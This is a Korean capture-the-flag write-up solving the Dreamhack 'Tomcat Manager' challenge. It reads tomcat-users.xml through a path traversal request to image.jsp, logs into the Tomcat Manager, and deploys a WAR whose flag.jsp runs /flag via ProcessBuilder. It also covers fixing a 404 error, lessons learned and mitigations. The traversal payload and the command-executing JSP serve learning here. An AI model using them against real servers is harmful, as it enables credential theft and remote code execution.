# B2 · Tomcat Manager (ProcessBuilder 실습)

> 같은 **Tomcat Manager** 문제를 `webshell.war` + `Runtime.exec` 방식이 아니라, **직접 작성한 `flagapp.war`의 `flag.jsp`가 `ProcessBuilder`로 `/flag`를 실행**하는 방식으로 다시 푼 기록이다. 기존 [B2 Tomcat Manager.md](B2%20Tomcat%20Manager.md) 문서와 소스·취약점은 동일하며, 배포한 WAR 구성과 404 오류를 해결한 과정이 다르다.

## 1. 목표

문제에서 제공하는 Dockerfile, `tomcat-users.xml`, `ROOT.war`를 분석해 Tomcat 서버에서 `/flag`에 저장된 FLAG를 획득한다.

## 2. 소스 분석

제공된 소스는 세 가지다.

- `Dockerfile`
- `tomcat-users.xml`
- `ROOT.war` (압축을 풀면 `index.jsp`, `image.jsp`가 들어 있다)

**① `Dockerfile`**

```dockerfile
COPY flag /flag
COPY ROOT.war /usr/local/tomcat/webapps/ROOT.war
COPY tomcat-users.xml /usr/local/tomcat/conf/tomcat-users.xml
```

- FLAG 파일은 컨테이너 루트의 `/flag`에 위치한다.
- `ROOT.war`가 Tomcat의 기본 애플리케이션으로 배포된다.
- `tomcat-users.xml`이 Tomcat 설정 경로(`/usr/local/tomcat/conf/`)에 그대로 들어간다.

**② `index.jsp`**

```jsp
<html>
<body>
    <center>
        <h2>Under Construction</h2>
        <p>Coming Soon...</p>
        <img src="./image.jsp?file=working.png"/>
    </center>
</body>
</html>
```

메인 페이지는 `image.jsp`에 `file=working.png`라는 쿼리스트링으로 이미지를 요청해서 보여주는 구조다.

**③ `image.jsp`**

```jsp
<%
String filepath = getServletContext().getRealPath("resources") + "/";
String _file = request.getParameter("file");

try {
    java.io.FileInputStream fileInputStream =
        new java.io.FileInputStream(filepath + _file);
    int i;
    while ((i = fileInputStream.read()) != -1) {
        out.write(i);
    }
    fileInputStream.close();
} catch (Exception e) {
    response.sendError(404, "Not Found !");
}
%>
```

`_file`에는 `request.getParameter("file")`로 받은 값이 **검증 없이 그대로** `filepath`에 이어 붙는다. 확장자 검사, 경로 화이트리스트, `../` 필터링이 전혀 없다는 점이 핵심이다.

## 3. 취약점

위 소스에서 확인되는 문제는 두 가지다.

1. **Path Traversal (경로 순회)** — `image.jsp`의 `file` 파라미터가 사용자 입력을 그대로 `FileInputStream` 경로에 연결하기 때문에, `../`를 섞어 `resources/` 바깥의 임의 파일을 읽을 수 있다. 그 대상이 하필 Tomcat 관리자 계정이 적힌 `tomcat-users.xml`이라는 점이 치명적이다.
2. **관리 콘솔(Tomcat Manager)의 WAR 배포 기능이 인증된 사용자에게 임의 애플리케이션 배포를 허용** — Path Traversal로 얻은 계정으로 `/manager/html`에 로그인하면, WAR 파일을 업로드해 서버에서 바로 실행되는 JSP를 올릴 수 있다. 이는 Tomcat Manager 자체의 정상 기능이지만, 외부에 노출된 상태에서 계정 정보가 유출되면 **임의 코드 실행(RCE)**으로 직결된다.

## 4. 공격 과정

**① 메인 페이지 확인**

문제 URL에 접속하면 `index.jsp`가 보여주는 "Under Construction" 페이지가 나오고, `image.jsp?file=working.png` 요청으로 이미지가 로드되는 것을 확인했다.

**② `file` 파라미터로 설정 파일 요청**

`file` 값에 상위 디렉터리 이동 문자열을 넣어 Tomcat 설정 파일을 요청했다.

```http
GET /image.jsp?file=../../../conf/tomcat-users.xml HTTP/1.1
Host: <문제 호스트>:<포트>
```

`getServletContext().getRealPath("resources")`가 가리키는 경로(`.../webapps/ROOT/resources`)를 기준으로, `../`를 필요한 만큼 반복해 `/usr/local/tomcat/conf/tomcat-users.xml`까지 거슬러 올라가는 방식이다. 실제 깊이는 Tomcat 배포 경로에 따라 `../`의 개수를 조정해야 했다.

**③ 응답이 깨진 이미지로 표시되는 현상 확인**

`<img>` 태그로 요청했기 때문에 브라우저는 응답을 이미지로 해석하려다 실패해 깨진 이미지 아이콘만 보여준다. 응답 자체는 정상적으로 내려오지만 화면에는 내용이 드러나지 않는다.

**④ 개발자 도구 Network 탭에서 원문 확인**

브라우저 개발자 도구의 **Network → 해당 요청 → Response** 탭을 열면, 브라우저가 렌더링을 포기한 것과 별개로 **서버가 실제로 내려준 응답 본문(XML 원문)**을 그대로 읽을 수 있다. `<img>` 태그 대신 주소창에 직접 요청을 입력하거나 Burp Suite Repeater로 요청을 보내도 동일하게 원문을 확인할 수 있다.

**⑤ Tomcat 관리자 계정 노출 확인**

`tomcat-users.xml`에는 아래와 같은 구조의 역할·계정 정의가 있었다.

```xml
<role rolename="manager-gui"/>
<role rolename="manager-script"/>
<role rolename="admin-gui"/>

<user username="tomcat" password="[REDACTED]"
      roles="manager-gui,manager-script,manager-jmx,manager-status,admin-gui,admin-script" />
```

`manager-gui` 권한이 부여된 계정이 평문 비밀번호와 함께 노출된다는 것을 확인했다. (실제 비밀번호 값은 본 문서에 기재하지 않는다.)

**⑥ `/manager/html` 접속**

Tomcat의 웹 관리 화면은 기본적으로 `/manager/html` 경로를 사용한다.

```text
http://<문제 호스트>:<포트>/manager/html
```

④에서 확인한 계정으로 로그인하면 **Tomcat Web Application Manager** 화면에 접근할 수 있고, 화면 하단의 **WAR file to deploy** 항목으로 새 애플리케이션을 배포할 수 있다.

**⑦ `flagapp.war` 작성과 배포**

`flag.jsp` 한 개만 포함한 WAR를 만들어 배포했다.

```text
flagapp.war
└── flag.jsp
```

`flag.jsp`의 핵심 코드는 아래와 같다.

```jsp
<%@ page import="java.io.*" %>
<%
    ProcessBuilder pb = new ProcessBuilder("/flag");
    pb.redirectErrorStream(true);
    Process process = pb.start();

    BufferedReader reader = new BufferedReader(
        new InputStreamReader(process.getInputStream())
    );
    String line;
    while ((line = reader.readLine()) != null) {
        out.println(line);
    }
    process.waitFor();
%>
```

- `ProcessBuilder("/flag")`: 서버 파일시스템의 `/flag` **실행 파일을 그대로 실행**한다. `FileInputStream`으로 텍스트를 읽는 것이 아니라 **프로세스로 구동**한다는 점이 `image.jsp`의 파일 읽기와 다르다.
- `redirectErrorStream(true)`: 표준 에러를 표준 출력에 합쳐서, 오류가 나도 내용을 놓치지 않게 한다.
- 이후 `process.getInputStream()`을 읽어 `/flag` 실행 결과(표준 출력)를 JSP 응답으로 그대로 출력한다.

WAR 업로드 후 Tomcat Manager의 애플리케이션 목록에 `/flagapp`이 새로 생성된 것을 확인했다.

**⑧ `/flagapp/` 접속 시 404 발생**

배포 직후 `/flagapp/`(컨텍스트 루트만)로 접속하니 404가 발생했다.

```http
GET /flagapp/ HTTP/1.1
Host: <문제 호스트>:<포트>
```

**⑨ `/flagapp/flag.jsp` 직접 요청**

컨텍스트 루트가 아니라 **배포한 파일명을 그대로 경로에 지정**해 요청했다.

```http
GET /flagapp/flag.jsp HTTP/1.1
Host: <문제 호스트>:<포트>
```

이 요청에 대해 `/flag` 실행 결과가 응답 본문에 출력되는 것을 확인했다.

## 5. 오류 해결

`/flagapp/`에서 404가 발생한 원인은 **해당 컨텍스트에 기본 시작 페이지(welcome file)가 없었기 때문**이다. Tomcat은 컨텍스트 루트로 요청이 들어오면 `web.xml`의 `welcome-file-list`에 정의된 파일(보통 `index.jsp`, `index.html` 등)을 찾는데, `flagapp.war`에는 `flag.jsp` 한 개만 들어 있고 `index.jsp`나 별도의 `web.xml`이 없어 welcome file을 찾지 못해 404를 반환한 것이다.

해결 방법은 두 가지 중 하나다.

1. 배포한 JSP 파일명을 정확히 지정해 `/flagapp/flag.jsp`처럼 직접 요청한다. (실제로 사용한 방법)
2. WAR에 `WEB-INF/web.xml`을 추가해 `flag.jsp`를 welcome file로 지정한다.

이번 풀이에서는 1번 방법으로 충분했기 때문에 별도의 `web.xml` 구성 없이 파일 경로를 직접 호출해 문제를 해결했다.

## 6. 성공 판단

아래 조건으로 FLAG 획득 성공 여부를 판단했다.

- `GET /flagapp/flag.jsp` 요청에 대해 HTTP 상태 코드가 정상적으로 반환되고, 응답 본문에 `DH{...}` 형식의 문자열이 출력되었다.
- 해당 출력이 `flag.jsp`가 정적으로 담고 있던 문자열이 아니라, `ProcessBuilder("/flag")`가 **서버에서 `/flag`를 실제로 실행한 표준 출력 결과**라는 점을 코드 흐름(`request → ProcessBuilder.start() → getInputStream() → BufferedReader → out.println`)으로 재확인했다.
- 즉, `/flag`를 텍스트 파일로 읽은 것이 아니라 **실행 파일로 구동한 뒤 그 출력값을 받아온 것**이라는 점에서 문제 의도(관리자 권한 WAR 배포를 통한 임의 명령 실행)에 부합함을 확인했다.

FLAG 실제 값과 ④에서 노출된 계정의 비밀번호는 보안상 본 문서에 기재하지 않는다.

## 7. 배운 점

- **입력 검증이 없는 파일 경로 파라미터는 단순 "이미지 로더"처럼 보여도 Path Traversal로 이어질 수 있다.** `image.jsp`는 이미지 전용으로 보이지만 확장자·경로 제한이 없어 서버 설정 파일까지 읽혔다.
- **브라우저가 응답을 렌더링하지 못해도 응답 본문 자체는 그대로 전달된다.** `<img>` 태그의 렌더링 실패와 실제 데이터 유출 여부는 별개이며, 개발자 도구나 프록시 도구로 원문을 확인하는 습관이 필요하다.
- **관리 콘솔 계정 노출은 곧바로 RCE로 이어질 수 있다.** `manager-gui` 권한을 가진 계정이 유출되면 WAR 배포를 통해 임의 코드 실행이 가능하므로, 관리 페이지 접근 제어와 자격 증명 보호가 매우 중요하다.
- **파일 읽기(`FileInputStream`)와 파일 실행(`ProcessBuilder`)은 전혀 다른 동작이다.** `/flag`가 텍스트 파일이 아니라 실행 파일로 제공된 경우, 단순히 내용을 "읽으려는" 접근과 "실행시켜 출력을 받는" 접근은 코드 작성 방식부터 달라야 한다.
- **WAR 배포 직후 컨텍스트 루트로 바로 접근되지 않을 수 있다.** `web.xml`의 welcome file 설정이 없으면 루트 경로 요청은 404가 나므로, 배포한 리소스의 실제 파일명을 기억해 두고 직접 요청하는 것이 중요하다.

## 8. 보안 대응 방안

- `image.jsp`처럼 파일 경로를 직접 조합하는 코드에는 **경로 화이트리스트 또는 허용된 파일명·확장자 목록**을 적용하고, `../`, 절대 경로, 널 바이트 등 경로 순회 패턴을 거부해야 한다. 가능하다면 `File.getCanonicalPath()`로 정규화한 뒤, 허용된 기준 디렉터리(`resources/`) 하위인지 검증하는 방식이 안전하다.
- `tomcat-users.xml`과 같은 설정 파일에 **평문 비밀번호를 저장하지 않고**, 강력한 임의 비밀번호로 설정하며 주기적으로 교체해야 한다.
- Tomcat Manager(`/manager/html`, `/manager/text` 등) 애플리케이션은 운영 환경에서 **필요하지 않다면 제거**하고, 꼭 필요하다면 `RemoteAddrValve` 등으로 접근 가능한 IP 대역을 제한하거나 VPN·사설망에서만 접근하도록 네트워크 단에서 분리해야 한다.
- `manager-gui`, `manager-script` 등 민감한 역할은 **최소 권한 원칙**에 따라 꼭 필요한 계정에만 부여하고, 애플리케이션 서비스 계정과 관리용 계정을 분리해야 한다.
- WAR 배포, 로그인 실패 등 관리 콘솔에 대한 접근과 변경 이력을 **로깅·모니터링**해, 비정상적인 배포 시도를 조기에 탐지할 수 있어야 한다.
- Tomcat 버전을 최신으로 유지하고, 알려진 Tomcat/Manager 관련 취약점에 대한 패치를 적용해야 한다.

## 9. 출처

- 문제: [Dreamhack Wargame - Tomcat Manager (#248)](https://dreamhack.io/wargame/challenges/248)
- 참고 스타일: [myhtml1231-star/write-up — WEB](https://github.com/myhtml1231-star/write-up/tree/main/WEB)
- 같은 문제의 다른 풀이 방식: [B2 Tomcat Manager.md](B2%20Tomcat%20Manager.md) (`webshell.war` + `Runtime.exec` 기반)
- Apache Tomcat 공식 문서: [Manager App HOW-TO](https://tomcat.apache.org/tomcat-9.0-doc/manager-howto.html)
